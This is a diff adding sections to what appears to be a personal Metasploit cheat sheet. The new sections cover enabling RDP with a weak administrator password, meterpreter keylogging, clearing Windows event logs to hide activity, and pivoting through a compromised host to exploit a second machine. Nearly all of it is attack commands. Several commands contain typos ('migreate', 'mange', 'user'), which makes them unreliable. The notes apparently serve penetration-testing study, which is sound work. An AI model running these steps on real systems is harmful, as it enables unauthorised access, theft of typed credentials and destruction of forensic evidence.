@@ -30,7 +30,12 @@ Metasploit Framework
 		2. [Token Impersonation](#Token_Impersonation)
 		3. [Pass-The-Hash](#Pass-The-Hash)
 	10. [Persistance](#Persistance)
-		1. [Windows](#Windows)
+		1. Windows
+			1. [Enableing RDP](#Enableing_RDP)
+	11. [Post](#Post)
+		1. Windows
+			1. [Keylogging](#Keylogging)
+			2. [EventLogs](#EventLogs)
 
 
 
@@ -415,7 +420,7 @@ Depends on workspace and modules ran within
 
 ## Persistance
 ### Windows
-*Example Flow*
+*Example Flow* - Shell service
 1. Get meterpreter session on target
 	1. `sysinfo` : grab what version of windows
 	2. `getuid` : need administrator access for persistance
@@ -430,3 +435,44 @@ Depends on workspace and modules ran within
 	2. `set lport <port>` : set same port as persistance
 	3. `run`
 
+#### Enableing_RDP
+*Port 3389*
+1. Get meterpreter session on target
+2. `search enable rdp` : find module
+3. `user post/windows/mange/enable_rdp`
+	1. `set session <num>` : set session
+	2. `run` : enable and open firewall port
+	3. `net user administrator password123` : not recommended!
+4. `xfreerdp /u:administrator /p:<pass> /v:<IP>` : login
+
+---
+
+## Post
+### Windows
+#### Keylogging
+
+1. Get meterpreter session on target
+2. `pgrep explorer` `migreate <pid>` : Migrate to explorer process.
+3. `help` : User interface commands section
+4. `keyscan_start` : start recording keys
+5. `keyscan_dump` : grab the buffer
+
+#### EventLogs
+Windows Event Log clearing
+1. once you are done in a meterpreter session
+2. `clearev` : clear event log
+
+#### Pivoting-windows
+Use a machine that is connected to another network to pivot to it.
+1. Get meterpreter session on target 1
+	1. `run autoroute -s <ip>/24` : add route with meterpreter
+2. `use auxiliary/scanner/portscan/tcp` : scanner
+	1. `set RHOSTS <target2>` : scan target 2 through route
+3. On meterpreter session 1
+	1. `portfwd add -l 1234 -p 80 -r <target2>` : forward 80 to local 1234
+4. `db_nmap -sS -sV -p1234 localhost` : nmap scan on target 2 through routed port forwarding for the port 80 service
+5. Target 2nd machine with exploit
+6. `use exploit/windows/badvlue_passthru` : use module
+	1. `set payload windows/meterpreter/bind_tcp` : use bind payload
+	2. `set LPORT 4422` : unused port
+	3. `set RHOSTS <target2>` : target 2 ip
